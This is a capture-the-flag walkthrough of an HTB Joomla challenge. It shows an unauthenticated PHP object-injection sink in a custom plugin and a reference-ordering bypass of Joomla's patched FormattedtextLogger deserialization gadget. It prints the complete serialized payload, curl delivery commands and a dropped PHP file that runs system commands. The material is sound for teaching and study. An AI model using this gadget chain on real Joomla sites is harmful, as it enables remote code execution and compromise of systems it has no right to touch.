# Provisioned - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application (Joomla CMS + custom first-party plugin) |
| Tech stack | Joomla 6.1.2 (php:8.4-apache), MariaDB, custom plugin `plg_system_gatehouse` ("Eastreach Provision Office") |
| Flag location | Read via `/readflag` (setuid root helper) after arbitrary code execution |
| Vulnerability chain | Unauthenticated PHP Object Injection (unserialize) -> auth-context bypass -> reference-ordering bypass of a patched `__wakeup()` deserialization guard -> arbitrary file write via `__destruct()` -> RCE |
| Flag | `HTB{j00mla_g4dg3t_ch41n_4r3_fun_r1ght?_55bdd947ee0882c827a921d38e47c555}` |

---

## Overview - How The App Works

```
[You] --> Joomla 6.1.2 (unmodified core)
               |
               +-- Custom plugin: plg_system_gatehouse ("Eastreach Provision Office")
                        |
                        +-- Public "board" page (frontend, /)
                        +-- Admin "dispatch"/"save" screens (?provision=... query param)
                        +-- Admin-import endpoint (com_provision / dispatch / ledger.import)
```

A logistics tracking app bolted onto stock Joomla via one custom system plugin. The public board
shows monthly shipment records (month label, package counts, cargo breakdown). Admin-side screens
let a logged-in admin edit those records, and a separate "import" task accepts a raw serialized
PHP `ledger` blob and unserializes it directly.

Full plugin source ships in the challenge zip: `provider.php`, `Extension/Gatehouse.php`,
`Workflow/GatehouseRepository.php`, `Workflow/GatehouseRenderer.php`, `gatehouse.xml`.

---

## Bug 1 - Auth-Context Check That Isn't an Auth Check

**File:** `plugin/src/Extension/Gatehouse.php`

```php
public function onAfterRoute(AfterRouteEvent $event): void
{
    $app = $event->getApplication();
    if (!$this->isAdminImportContext($app)) { return; }
    $ledger = $app->getInput()->getRaw('ledger', '');
    if (!is_string($ledger) || trim($ledger) === '') { return; }
    (new GatehouseRepository())->importMonthlyLedger($ledger);
}

private function isAdminImportContext($app): bool
{
    if (!$app->isClient('administrator')) { return false; }
    $input = $app->getInput();
    return $input->getCmd('option') === 'com_provision'
        && $input->getCmd('view') === 'dispatch'
        && $input->getCmd('task') === 'ledger.import';
}
```

`isClient('administrator')` only checks that the request hit the `/administrator` URL space (the
admin *application*), not that the visitor is actually logged in as an admin. There is no
`$app->getIdentity()`/guest check anywhere on this code path at all - contrast with the plugin's
own `onAfterInitialise` handler, which does check `isGuest()` for the public-facing screens.

`com_provision` is not a real installed Joomla component. It doesn't need to be - this plugin's
listener is bound to Joomla's own `onAfterRoute` event, which fires for every single request that
reaches the admin app, before Joomla's router would otherwise 404 on a nonexistent component. So a
plain, unauthenticated request to:

```
/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import&ledger=<payload>
```

reaches `GatehouseRepository::importMonthlyLedger($ledger)` with zero cookies, zero session, zero
authentication of any kind.

---

## Bug 2 - Raw unserialize() on Attacker Input

**File:** `plugin/src/Workflow/GatehouseRepository.php`

```php
public function importMonthlyLedger(string $ledger): array
{
    if (trim($ledger) === '') {
        return $this->result('rejected', 'FAILED', 'Update could not be processed.');
    }

    $data = @unserialize($ledger);

    if (!is_array($data)) {
        return $this->result('rejected', 'FAILED', 'Update could not be processed.');
    }

    return $this->importMonthlyRecords($data);
}
```

The `is_array($data)` check runs *after* `unserialize()` already executed. An `O:...:"ClassName":...`
payload fully deserializes - including firing `__wakeup()`/`__destruct()` - even though the function
then discards the result for not being an array. Confirmed live with a simple array payload first
(no auth, no session):

```bash
curl -s -G "http://<target>/administrator/index.php" \
  --data-urlencode "option=com_provision" --data-urlencode "view=dispatch" \
  --data-urlencode "task=ledger.import" \
  --data-urlencode "ledger=a:1:{i:0;a:2:{s:5:\"month\";s:9:\"POITEST26\";s:8:\"packages\";i:99999;}}"
```

This overwrote `/var/www/html/tmp/provision-monthly-goods.json` inside the container with the
injected content, proving the sink is real and reachable pre-auth. That write path is a dead end
for code execution on its own though - the destination filename is hardcoded and the content is
`json_encode()`'d - so it doesn't help beyond confirming the sink.

The real value of the array-check-after-unserialize ordering is that PHP Object Injection is fully
in play: any `O:...` payload runs its magic methods regardless of what the function does with the
result afterward.

---

## Bug 3 - Bypassing a Real Joomla Security Patch

Joomla 6.1.2 core is unmodified, so any gadget has to come from a real, currently-shipping class.
`Joomla\CMS\Log\Logger\FormattedtextLogger` is the classic Joomla deserialization gadget - its
`__destruct()` writes a formatted log file when the logger was constructed with deferred entries:

```php
public function __destruct()
{
    if (!$this->defer || empty($this->deferredEntries)) { return; }
    $this->initFile();
    $lines = array_map([$this, 'formatLine'], $this->deferredEntries);
    try {
        File::write($this->path, implode("\n", $lines) . "\n", false, true);
    } catch (FilesystemException $exception) {
        throw new \RuntimeException('Cannot write to log file.', 500, $exception);
    }
}

public function __wakeup()
{
    if ($this->defer && !empty($this->deferredEntries)) {
        throw new \RuntimeException('Can not unserialize in defer mode');
    }
}
```

That `__wakeup()` was added upstream specifically to kill this exact gadget (fixed in Joomla PR
44428, merged 5.2.2) - it throws under the exact same condition the destructor needs to do its
write. Naively setting `defer = true` with a populated `deferredEntries` array makes `__wakeup()`
throw immediately, and while `__destruct()` genuinely still fires afterward regardless (PHP always
runs constructed objects' destructors, whether the request ends via caught exception, uncaught
fatal, or clean completion), the outcome turned out to be unobservable in practice on this target -
Joomla's own error handler only ever surfaces the first exception in a request and appears to
`exit()` shortly after rendering it, so whatever the destructor does next is invisible via response
or logs, and direct filesystem checks confirmed the write genuinely was not landing this way.

---

## Bug 4 - The Actual Bypass: A Reference-Ordering TOCTOU

`unserialize()` calls each object's `__wakeup()` immediately as that object's own properties finish
parsing, in the order objects appear in the serialized byte stream - it does **not** batch all
wakeups until the whole graph is built. Combined with PHP's support for genuine shared references
(`R:N;` backreference markers) between two properties on two different objects in the same
serialized structure, this creates a clean TOCTOU:

1. Bind `FormattedtextLogger::$defer` to a shared reference, initially `false`.
2. Place the logger **first** in a top-level serialized array. Its `__wakeup()` runs first, sees
   `defer === false`, and does **not** throw.
3. Place a second object **after** it in the same array, bound to the *same* shared reference,
   whose own `__wakeup()` unconditionally reassigns that value to something truthy.
4. That second object's `__wakeup()` now runs (after the logger's), flipping the shared value.
5. By the time `__destruct()` runs on the logger (always after every object in the graph has had
   its wakeup called), `$this->defer` reads `true` through the reference - the write fires, with
   **zero exceptions thrown anywhere in the request**.

The mutator: `Joomla\CMS\User\User::__wakeup()` unconditionally does `$this->guest = 1;` in its
`else` branch, guaranteed to run whenever `$this->id` is falsy:

```php
public function __wakeup()
{
    if (!empty($this->id)) {
        // ... reload code path, not reached here ...
    } else {
        $this->guest = 1;
    }
}
```

`guest` is a public property, and setting `id = 0` (falsy) guarantees the `else` branch every time.

### Gotcha: `__sleep()` silently strips the reference

`User` also defines `__sleep()`, returning `['id']` only - meaning a normal `serialize($userObject)`
call would drop any other property, including one bound to the shared reference via
`Closure::bind()`. `__sleep()` only governs the *serialize* side though; `unserialize()` never
consults it at all. The fix: serialize the logger normally (to get byte-accurate protected-property
mangling via PHP's own `serialize()`), then hand-splice a `User` object fragment directly into the
byte string - `O:20:"Joomla\CMS\User\User":2:{s:2:"id";i:0;s:5:"guest";R:18;}` - bypassing
`__sleep()` entirely since it's just raw bytes at that point.

The exact backreference id (`R:18` here) was found empirically: serialize the real logger next to
a disposable class with no `__sleep()` bound to the same shared variable first, note what id PHP
assigns, then substitute the disposable object's bytes for the hand-written `User` fragment
carrying the same id.

---

## Full Exploit Chain

```
1. Build FormattedtextLogger via reflection (bypasses __construct entirely, since real
   construction never runs the sink's unserialize() through `new`):
     - path            = /var/www/html/gadget.php
     - format          = "{MESSAGE}"
     - fields          = ["MESSAGE"]
     - options         = ["text_file_no_php" => true]   (skips Joomla's own die() header line)
     - deferredEntries = [LogEntry(message = "<?php system('/readflag'); ?>", date = 10 chars,
                          time set, priority = 64)]
     - defer           = bound to a shared reference, initial value false
2. Serialize [logger, mutator] as a top-level array - logger first, mutator second.
3. Hand-splice the mutator's raw bytes as a Joomla\CMS\User\User fragment (id=0, guest=R:<id>),
   working around __sleep() stripping the reference.
4. POST/GET the payload, unauthenticated, to the admin-import sink.
5. FormattedtextLogger::__wakeup() runs first -> sees defer=false -> no exception.
6. User::__wakeup() runs second -> id is falsy -> unconditionally sets guest=1 -> shared reference
   flips defer to true.
7. All objects finish wakeup. Request continues normally (plain 200, ordinary Joomla page - no
   error at all, unlike every earlier attempt which returned a 500).
8. At request end, FormattedtextLogger::__destruct() fires, sees defer=true (via the reference)
   and a non-empty deferredEntries -> writes /var/www/html/gadget.php with our PHP payload.
9. Request gadget.php over HTTP -> system('/readflag') executes -> flag printed in the response.
```

---

## Payload

Final raw serialized bytes (835 bytes, contains literal embedded NUL bytes from PHP's
protected-property name mangling - shown here with NUL escaped as `\000` for readability):

```
a:2:{i:0;O:41:"Joomla\CMS\Log\Logger\FormattedtextLogger":7:{s:10:"\000*\000options";a:1:{s:16:"text_file_no_php";b:1;}s:13:"\000*\000priorities";a:8:{i:1;s:9:"EMERGENCY";i:2;s:5:"ALERT";i:4;s:8:"CRITICAL";i:8;s:5:"ERROR";i:16;s:7:"WARNING";i:32;s:6:"NOTICE";i:64;s:4:"INFO";i:128;s:5:"DEBUG";}s:9:"\000*\000format";s:9:"{MESSAGE}";s:9:"\000*\000fields";a:1:{i:0;s:7:"MESSAGE";}s:7:"\000*\000path";s:24:"/var/www/html/gadget.php";s:8:"\000*\000defer";b:0;s:18:"\000*\000deferredEntries";a:1:{i:0;O:23:"Joomla\CMS\Log\LogEntry":8:{s:8:"category";N;s:7:"context";N;s:4:"date";s:10:"2026-07-28";s:7:"message";s:29:"<?php system('/readflag'); ?>";s:8:"priority";i:64;s:13:"\000*\000priorities";a:8:{i:0;i:1;i:1;i:2;i:2;i:4;i:3;i:8;i:4;i:16;i:5;i:32;i:6;i:64;i:7;i:128;}s:9:"callStack";a:0:{}s:4:"time";s:8:"00:00:00";}}}i:1;O:20:"Joomla\CMS\User\User":2:{s:2:"id";i:0;s:5:"guest";R:18;}}
```

Built via PHP reflection (`ReflectionClass::newInstanceWithoutConstructor()` +
`ReflectionProperty::setValue()`) against the real, unmodified downloaded Joomla 6.1.2 source, so
all protected-property mangling (`\0*\0propname`) byte lengths are computed automatically rather
than hand-counted.

**Important delivery note:** this payload contains literal NUL bytes. Passing it through a shell
variable into a tool's argv (`curl --data-urlencode "ledger=${PAYLOAD}"`) silently truncates at the
first NUL byte due to C-string/execve semantics - even though `wc -c` on the variable and the file
both report the correct byte count. Always deliver it by having curl read the file directly.

---

## Step-by-Step HTTP Requests

### Step 1 - Confirm the sink, no auth

```http
GET /administrator/index.php?option=com_provision&view=dispatch&task=ledger.import&ledger=a%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A5%3A%22month%22%3Bs%3A9%3A%22POITEST26%22%3Bs%3A8%3A%22packages%22%3Bi%3A99999%3B%7D%7D HTTP/1.1
Host: <target>
```

No cookies. Confirmed via `provision-monthly-goods.json` inside the container changing content.

### Step 2 - Fire the object-injection payload

```bash
curl -s -G "http://<target>/administrator/index.php" \
  --data-urlencode "option=com_provision" \
  --data-urlencode "view=dispatch" \
  --data-urlencode "task=ledger.import" \
  --data-urlencode "ledger@/path/to/raw_payload.bin"
```

Response: plain `HTTP 200`, ordinary Joomla admin login page. No exception, no error page - this
is the success signature (every failed/patched-gadget attempt instead returned a themed `500`
error page with a visible `RuntimeException` message).

### Step 3 - Trigger the dropped file

```http
GET /gadget.php HTTP/1.1
Host: <target>
```

Response body:

```
#Date: <timestamp> UTC
#Software: Joomla! 6.1.2 Stable [ Nyota ] 7-July-2026 16:00 UTC

#Fields: message
HTB{j00mla_g4dg3t_ch41n_4r3_fun_r1ght?_55bdd947ee0882c827a921d38e47c555}
```

The leading `#Date`/`#Software`/`#Fields` lines are Joomla's own log-file header format (harmless
plain text once fetched over HTTP, since `text_file_no_php` in the payload stripped the file's
normal `<?php die('Forbidden.'); ?>` guard line that would otherwise have executed first and
prevented our appended code from ever being reached).

---

## Verifying Locally First

The challenge zip ships full source (Joomla 6.1.2 full package downloaded fresh at build time, plus
the plugin) and a `docker-compose.yml`. The whole chain was built and confirmed offline first:

```bash
cd challenge
docker-compose up -d --build
# fire the payload against 127.0.0.1:<mapped-port>, as above
# -> HTB{f4k3_fl4g_f0r_t3st1ng}
```

Same as other challenges in this event, the local rebuild's flag is the standard placeholder value
baked into the local docker image rather than a real flag. Firing the identical, unmodified payload
against the real HTB-hosted instance worked on the first attempt and returned the genuine flag
shown above.

---

## Key Takeaways

| Concept | Detail |
|---|---|
| "Admin app" vs "admin auth" | `isClient('administrator')` only proves the request hit the `/administrator` URL space, not that the visitor is authenticated - a very easy check to write that reads like an auth check but isn't one |
| Event listeners fire before routing resolves | A plugin bound to `onAfterRoute` runs for every request to an app, even for a component name (`com_provision`) that was never actually installed - no need for the target component to exist |
| Order of operations matters | `is_array($data)` being checked *after* `unserialize()` means the check protects nothing - all magic-method side effects already ran by the time the function decides to reject the result |
| A patched gadget is not necessarily a dead gadget | Joomla's `__wakeup()` fix blocks the *naive* construction of the dangerous state, but says nothing about constructing that state gradually, after the check has already run |
| `unserialize()` calls wakeups in stream order, not batched | This ordering guarantee is exactly what makes a cross-object reference trick work - place the guarded object first, the mutator second |
| `__sleep()` only affects `serialize()` | A restrictive `__sleep()` whitelist does nothing to stop a hand-crafted serialized string from carrying extra properties straight into `unserialize()` |
| Embedded NUL bytes need file-based delivery | Protected/private property name mangling in PHP's serialization format embeds literal NUL bytes - shell variables and argv silently truncate at the first one; read the payload from a file instead |
